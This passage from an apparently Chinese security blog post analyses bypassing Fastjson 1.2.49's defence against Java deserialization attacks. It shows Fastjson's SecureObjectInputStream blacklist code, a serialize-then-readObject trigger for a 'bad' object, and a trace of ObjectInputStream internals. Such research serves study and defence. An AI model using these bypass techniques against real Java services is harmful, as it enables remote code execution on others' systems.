+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">objectOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bad</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">objectInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">objectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><h3 id="0x02-fastjson-1249-bypass">0x02 Fastjson 1.2.49 bypass</h3>
+<p>Fastjson1.2.49 及以后，<code>JSONObject</code> 实现了自己的反序列化逻辑</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">final</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">in</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">SecureObjectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ensureFields</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">SecureObjectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">fields</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">!</span><span style="color:#e06c75">SecureObjectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">fields_error</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">secIn</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">SecureObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">in</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">secIn</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">NotActiveException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">// skip
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">in</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Entry</span> <span style="color:#e06c75">entry</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">entrySet</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">final</span> <span style="color:#e06c75">Object</span> <span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">entry</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getKey</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ParserConfig</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">global</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">checkAutoType</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">final</span> <span style="color:#e06c75">Object</span> <span style="color:#e06c75">value</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">entry</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getValue</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ParserConfig</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">global</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">checkAutoType</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">SecureObjectInputStream</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">ObjectInputStream</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">static</span> <span style="color:#e06c75">Field</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">fields</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">static</span> <span style="color:#c678dd">volatile</span> <span style="color:#e5c07b">boolean</span> <span style="color:#e06c75">fields_error</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">ensureFields</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">fields</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">!</span><span style="color:#e06c75">fields_error</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">final</span> <span style="color:#e06c75">Field</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">declaredFields</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredFields</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">fieldnames</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">[]{</span><span style="color:#98c379">&#34;bin&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;passHandle&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;handles&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;curContext&#34;</span><span style="color:#56b6c2">};</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">Field</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">array</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Field</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">fieldnames</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">];</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">fieldnames</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">++)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">field</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">TypeUtils</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">.</span><span style="color:#e06c75">getField</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#56b6c2">,</span> <span style="color:#e06c75">fieldnames</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">i</span><span style="color:#56b6c2">]</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#56b6c2">,</span> <span style="color:#e06c75">declaredFields</span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">field</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e06c75">array</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">i</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">field</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">fields</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">array</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Throwable</span> <span style="color:#e06c75">error</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">fields_error</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#61afef;font-weight:bold">SecureObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">in</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">super</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">in</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">fields</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">++)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">final</span> <span style="color:#e06c75">Field</span> <span style="color:#e06c75">field</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">fields</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">i</span><span style="color:#56b6c2">];</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">final</span> <span style="color:#e06c75">Object</span> <span style="color:#e06c75">value</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">field</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">in</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">field</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">IllegalAccessException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">fields_error</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">protected</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">resolveClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ObjectStreamClass</span> <span style="color:#e06c75">desc</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">String</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">desc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#d19a66">2</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">int</span> <span style="color:#e06c75">index</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">lastIndexOf</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#39;[&#39;</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">index</span> <span style="color:#56b6c2">!=</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">substring</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">index</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">&gt;</span> <span style="color:#d19a66">2</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">charAt</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;L&#39;</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">charAt</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;;&#39;</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">substring</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">name</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ParserConfig</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">global</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">checkAutoType</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">name</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Feature</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">SupportAutoType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">mask</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#c678dd">super</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">resolveClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">desc</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">protected</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">resolveProxyClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">interfaces</span><span style="color:#56b6c2">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span> <span style="color:#e06c75">interfacename</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">interfaces</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#7f848e">//检查是否处于黑名单
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                <span style="color:#e06c75">ParserConfig</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">global</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">checkAutoType</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">interfacename</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#c678dd">super</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">resolveProxyClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">interfaces</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//Hack:默认构造方法会调用这个方法，重写此方法使用反射还原部分关键属性
+</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">protected</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readStreamHeader</span><span style="color:#56b6c2">()</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">StreamCorruptedException</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
+</span></span></code></pre></div><p><code>JSONObject</code> 自定义了一个静态内部类 <code>SecureObjectInputStream</code>，当反序列化流程执行到 <code>JSONObject</code> 时就会触发 <code>resolveClass</code> 、<code>resolveProxyClass</code> 方法拦截恶意类。</p>
+<p>不过Fastjson 作为外部依赖，只能避免自己的类不被恶意利用，它的检测功能也必须在 <code>JSONObject</code>、<code>JSONArray</code> 被反序列化后才能启动，Fastjson 是无法防御在它之前的反序列化流程的</p>
+<pre tabindex="0"><code>ObjectInputStream#readObject() -&gt; OneClass#readObject() -&gt; JSONObject#readObject() -&gt; AnotherClass#readObject()
+
+// Fastjson 只能检测JSONObject及后续的Another
+</code></pre><p>比如用户使用了 <code>ObjectInputStream</code> 等不安全的反序列化类，如果可以通过某些方式绕过 <code>JSONObject</code> 的 <code>resolveClass</code> 和 <code>resolveProxyClass</code> 检查，那 <code>Fastjson</code> 的修复就失效了</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">byteArrayOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">objectOutputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">objectOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bad</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ByteArrayInputStream</span> <span style="color:#e06c75">byteArrayInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayOutputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">());</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">objectInputStream</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">byteArrayInputStream</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">objectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readObject</span><span style="color:#56b6c2">();</span>
+</span></span></code></pre></div><p>查阅 <code>ObjectInputStream</code> 的源码发现， <code>resolveClass</code> 和 <code>resolveProxyClass</code> 的 <code>Caller</code> 都是 <code>readClassDesc</code></p>
+<pre tabindex="0"><code>resolveClass -&gt; readNonProxyDesc -&gt; readClassDesc
+resolveProxyClass -&gt; readProxyDesc -&gt; readClassDesc
+</code></pre><p><code>readClassDesc</code> 的上级调用则是：</p>
+<pre tabindex="0"><code>readClass
+readProxyDesc
+readNonProxyDesc
+readArray
+readEnum
+readOrdinaryObject
+</code></pre><p><strong>ObjectInputStream#readObject0</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">switch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">tc</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_NULL</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">readNull</span><span style="color:#56b6c2">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_REFERENCE</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">readHandle</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">unshared</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_CLASS</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">readClass</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">unshared</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_CLASSDESC</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_PROXYCLASSDESC</span><span style="color:#56b6c2">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">readClassDesc</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">unshared</span><span style="color:#56b6c2">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">case</span> <span style="color:#e06c75">TC_STRING</span><span style="color:#56b6c2">:</span>
